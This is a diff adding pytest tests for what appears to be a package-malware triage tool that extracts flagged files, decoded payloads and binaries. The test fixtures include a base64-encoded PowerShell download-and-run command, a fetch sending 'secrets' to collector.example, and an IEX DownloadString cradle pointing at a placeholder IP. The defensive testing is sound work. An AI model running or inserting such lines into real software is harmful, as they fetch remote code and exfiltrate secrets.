@@ -127,3 +127,51 @@ def test_install_time_files_found_at_any_nesting_depth():
 def test_install_hooks_detected_in_nested_packages():
     flags = package_features.profile([("sample-v1/package/package.json", b'{"scripts":{"postinstall":"node i.js"}}'), ("sample-v1/package/i.js", b"1")])
     assert "install_hook" in flags
+
+
+def test_triage_evidence_supplies_flagged_file_decoded_payload_and_binary():
+    import base64
+
+    script = "Invoke-WebRequest https://payload.example/stage2.ps1 -OutFile s.ps1; ./s.ps1"
+    blob = base64.b64encode(script.encode("utf-16-le")).decode()
+    members = [
+        ("package/native/runner.ps1", f'$Setup = "{blob}"\n[IO.File]::WriteAllBytes("setup.ps1", [Convert]::FromBase64String($Setup))\n'.encode()),
+        ("package/bin/tool", b"\x7fELF" + b"\x00" * 64),
+        ("package/bin/cli.js", b'require("child_process").spawnSync(require("path").join(__dirname, "tool"), process.argv.slice(2))'),
+    ]
+    findings = [{"rule_id": "YARA:x", "file_path": "package/native/runner.ps1", "safe_context": "[IO.File]::WriteAllBytes(\"setup.ps1\""}]
+    evidence = package_features.triage_evidence(members, findings, ["child_process", "long_base64"])
+    assert evidence["flagged_files"][0]["path"] == "package/native/runner.ps1"
+    assert evidence["flagged_files"][0]["truncated"] is False
+    assert evidence["decoded_payloads"][0]["text"] == script
+    assert evidence["decoded_payloads"][0]["encoding"] == "utf-16-le"
+    assert evidence["binaries"] == [{"path": "package/bin/tool", "bytes": 68, "kind": "ELF", "referenced_by": ["package/bin/cli.js"]}]
+    assert any(item["flag"] == "child_process" and item["file_path"] == "package/bin/cli.js" for item in evidence["flag_locations"])
+
+
+def test_triage_evidence_keeps_matched_regions_of_a_large_file():
+    filler = "const pad = 1;\n" * 4000
+    text = "// header\n" + filler + "fetch('https://collector.example/x', {method: 'POST', body: secrets})\n" + filler
+    findings = [{"file_path": "package/dist/index.js", "safe_context": "fetch('https://collector.example/x', {method: 'POST', body: secrets})"}]
+    item = package_features.triage_evidence([("package/dist/index.js", text.encode())], findings, [])["flagged_files"][0]
+    assert item["truncated"] is True
+    assert len(item["content"]) < package_features.FLAGGED_FILE_BYTES + 200
+    assert item["content"].startswith("// header")
+    assert "collector.example" in item["content"]
+
+
+def test_decode_payload_describes_binary_and_skips_garbage():
+    import base64
+
+    assert package_features.decode_payload(base64.b64encode(b"MZ" + b"\x00" * 300).decode())["kind"] == "Windows PE"
+    assert package_features.decode_payload(base64.b64encode(bytes(range(256)) * 2).decode())["kind"] == "binary data"
+
+
+def test_triage_evidence_uses_yara_match_offsets_for_large_files():
+    filler = "é = 1;\n" * 6000  # multi-byte characters: byte and character offsets differ
+    data = (filler + "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')\n" + filler).encode()
+    offset = data.index(b"IEX")
+    finding = {"file_path": "package/x.ps1", "match_offsets": [offset], "safe_context": ""}
+    item = package_features.triage_evidence([("package/x.ps1", data)], [finding], [])["flagged_files"][0]
+    assert item["truncated"] is True and item["complete"] is False and item["matched_regions_shown"] is True
+    assert "DownloadString('http://203.0.113.9/a')" in item["content"]
